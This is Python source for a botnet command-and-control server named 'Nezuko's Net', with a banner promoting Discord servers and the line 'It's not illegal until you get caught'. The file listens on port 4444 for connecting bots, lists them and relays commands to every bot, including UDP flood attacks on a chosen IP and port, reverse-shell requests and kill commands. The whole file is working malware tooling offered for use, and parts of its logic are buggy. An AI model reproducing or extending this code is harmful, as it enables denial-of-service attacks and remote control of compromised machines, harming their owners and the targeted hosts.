from cgitb import reset
from threading import Thread
from time import sleep
import ctypes, socket, sys, os, time
import platform, signal
from random import choice
from typing import Union, Tuple
from pystyle import Colors, Colorate, Write, Center
from colorama import Fore as color, Style

def clear():
	if platform.system() == "Windows":
		os.system("cls")
	else:
		os.system("clear")

def logo():
        banner = f"""

                                                  ╔╗╔┌─┐┌─┐┬ ┬┬┌─┌─┐           
                                                  ║║║├┤ ┌─┘│ │├┴┐│ │           
                                                  ╝╚╝└─┘└─┘└─┘┴ ┴└─┘ {color.RESET}{color.GREEN}v1.0{color.RESET}           
                                      ╚══════╦════════════════════════╦══════╝
                               ╔═════════════╩════════════════════════╩═════════════╗
                               ║         {color.WHITE}    ~ Welcome to Nezuko's Net{color.RESET}{color.BLUE}{Style.DIM}              ║
                               ║      {color.WHITE}       ~ Developed by @7evenSecc        {color.RESET}{color.BLUE}{Style.DIM}      ║
                               ╚════════════════════════════════════════════════════╝
                       ╔═════════════════════════════════════════════════════════════════════╗ 
                       ║  {color.WHITE}~ Nesuko's Offical Discord server: {color.RESET}{color.GREEN}https://discord.gg/bullets {color.RESET}~{color.LIGHTMAGENTA_EX}{Style.DIM}    ║
                       ║            {color.WHITE}"   It's not illegal until you get caught  "{color.RESET}{color.LIGHTMAGENTA_EX}             ║
                       ╚═════════════════════════════════════════════════════════════════════╝

        """
        print(Center.XCenter(Colorate.Vertical(Colors.purple_to_blue, banner, 2)))

class Colours:
	def __init__(self): 
		if platform.system() == 'Windows':
			kernel32 = ctypes.windll.kernel32
			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
		COMMANDS = {
			# Lables
			'info': (33, '[!] '),
			'que': (34, '[?] '),
			'bad': (31, '[-] '),
			'good': (32, '[+] '),
			'run': (97, '[~] '),
			# Colors
			'green': 32,
			'lgreen': 92,
			'lightgreen': 92,
			'grey': 37,
			'black': 30,
			'red': 31,
			'lred': 91,
			'lightred': 91,
			'cyan': 36,
			'lcyan': 96,
			'lightcyan': 96,
			'blue': 34,
			'lblue': 94,
			'lightblue': 94,
			'purple': 35,
			'yellow': 93,
			'white': 97,
			'lpurple': 95,
			'lightpurple': 95,
			'orange': 33,
			# Styles
			'bg': ';7',
			'bold': ';1',
			'italic': '3',
			'under': '4',
			'strike': '09',
		}
		for key, val in COMMANDS.items():
			value = val[0] if isinstance(val, tuple) else val
			prefix = val[1] if isinstance(val, tuple) else ''
			locals()[key] = lambda s, prefix=prefix, key=value: _gen(s, prefix, key)
			self.__dict__[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

	def _gen(self,string, prefix, key):
		colored = prefix if prefix else string
		not_colored = string if prefix else ''
		result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
		return result



class Server(Colours):
	co=["green","lgreen","lightgreen","grey","red","lred","lightred","cyan","lcyan","lightcyan","blue","lblue","lightblue","purple","yellow","white","lpurple","lightpurple","orange"]
	
	def __init__(self, connect:Tuple[str,int]=("0.0.0.0",4444)):
		super().__init__()
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		logo()
		self.all_connections = []
		self.all_address = []
		self.stop = False
		if self._bind(connect):
			while True:
				self._take_cmd()

	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
		print("\nExiting....")
		self.stop = True
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _bind(self, connect:Tuple[str,int]) -> bool:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.bind(connect)
		self.sock.listen()
		self.sock.settimeout(0.5)
	
		Thread(target=self.collect).start()
		Thread(target=self.check).start()

		return True


	def count(self):	
		for k, (ip, port) in enumerate(self.all_address):
			k = k + 1
			results = results+self.__dict__[choice(self.co)](f'{[k]}    {ip}:{port}    CONNECTED USERS\n')

	def _print_help(self):
		clear()
		x= """
																											╔═════════════════════════════════════════════════════════════════════╗
																											║    Usage: attack udp <ip> <port> <time in second> <thread>      	 ║
																											║═════════════════════════════════════════════════════════════════════║
																											║									 ║
																											║   [0] connect	             Create a reverse shell		 ║
																											║   [1] ping			     Checks if clients alive or not. 	 ║
																											║   [2] kill			     Kills all client connections. 	 ║
																											║   [3] list			     Show online clients.           	 ║
																											║   [4] banner		     Displays botnet banner.             ║
																											║   [5] update	    	     update the clients list.      	 ║
																											║   [6] exit or quit	     	     quit/exit program.                  ║
																											║									 ║
																											╚═════════════════════════════════════════════════════════════════════╝
		"""
		print(Colorate.Vertical(Colors.purple_to_blue,x,1))

	def collect(self):
		global conn
		while not self.stop:
			try:
				conn, address = self.sock.accept()
				self.all_connections.append(conn)
				self.all_address.append(address)
			except socket.timeout:
				continue
			except socket.error:
				continue
			except Exception as e:
				print("Error accepting connections")

	def _take_cmd(self):
		cmd = Write.Input(f"""
		   ╔═════[{os.getlogin()}@Nezuko]
           	   ╚═:~#  """, Colors.purple_to_blue, interval=0.0025).strip()

		if cmd:
			if cmd == "list" or cmd == "3":
				clear()
				global i
				results = ''
				for i, (ip, port) in enumerate(self.all_address):
					i = i + 1
					results = results+self.__dict__[choice(self.co)](f'{[i]}    {ip}:{port}    CONNECTED\n')
				
				print(Colorate.Vertical(Colors.purple_to_blue,"""
																									╔═════════════════════════════════════════════════════════════════════╗
																									║		            Client List		   		      ║
																									╚═════════════════════════════════════════════════════════════════════╝   
                """, 2), "\n" + results)


			elif cmd == "help":
				self._print_help()

			elif cmd == "update" or cmd == "5":
				clear()
				logo()
				print(Center.XCenter(color.GREEN+"Updated Client's list"+color.RESET))
				self.check(display=True,always=False)

			elif cmd == "banner" or cmd == "4":
				clear()
				logo()
				os.system("title Nezuko Net / Connected bot's {}".format(i))

			elif cmd in ["exit","quit"]:
				self.exit_gracefully()

			elif "connect" in cmd:
				for i, (ip, port) in enumerate(self.all_address):
					try:
						print("Attempting to creating shell...")
						time.sleep(2)

						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+] {self.all_connections[i].recv(1024*5).decode("ascii")}'))

						target = str(cmd.replace("connect","").replace(" ",""))
						IPS = str(self.all_address).replace("'","").replace("]","").replace("[","").replace(" ","").replace("","")
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]

				if True == True:
					time.sleep(1)
					print("Join https://discord.gg/6pGRfZ9dKy")
				else:
					print("Could not establish an TCP connection.")
				
			elif "attack" in cmd:
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]

			elif cmd == "ping" or "kill" or cmd == "1" or "2":
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]

			else:
				print(f"{color.RED}Command Invalid.{color.RESET}")
				time.sleep(2)
				clear()


	def check(self, display:bool=False, always:bool=True):
		while not self.stop:
			c=0
			for n,tcp in zip(self.all_address,self.all_connections):
				c+=1
				try:
					tcp.send(str.encode("ping"))
					if tcp.recv(1024).decode("utf-8") and display:
							print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}   {color.GREEN}LIVE{color.RESET}'))
				except:
					if display:
						print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    {color.RED}DEAD{color.RESET}'))
					del self.all_address[c-1]
					del self.all_connections[c-1]
					continue
			if not always:
				break
			
			sleep(0.5)

if __name__ == '__main__':
	Server()
